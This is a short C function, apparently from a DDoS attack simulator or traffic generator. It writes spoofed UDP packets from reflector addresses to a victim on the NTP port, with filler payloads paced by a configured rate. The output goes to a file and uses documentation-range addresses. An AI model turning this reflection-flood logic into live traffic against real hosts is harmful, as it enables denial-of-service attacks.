#include "attacks.h"

u64
unit_reflection(FILE *f, u32 index)
{
	u8 reflector[4];
	u8 payload[1400];
	u16 i;

	reflector[0] = 203;
	reflector[1] = 0;
	reflector[2] = 113;
	reflector[3] = (u8)(10 + (index % (g_atk.bots ? g_atk.bots : 1)));
	for (i = 0; i < g_atk.payload_len; i++)
		payload[i] = (u8)('R' + (i % 20));
	send_udp(f, reflector, g_atk.victim, 123,
	    (u16)rng_range(1024, 65535), payload, g_atk.payload_len);
	return (1000000u / (g_atk.rate ? g_atk.rate : 1));
}
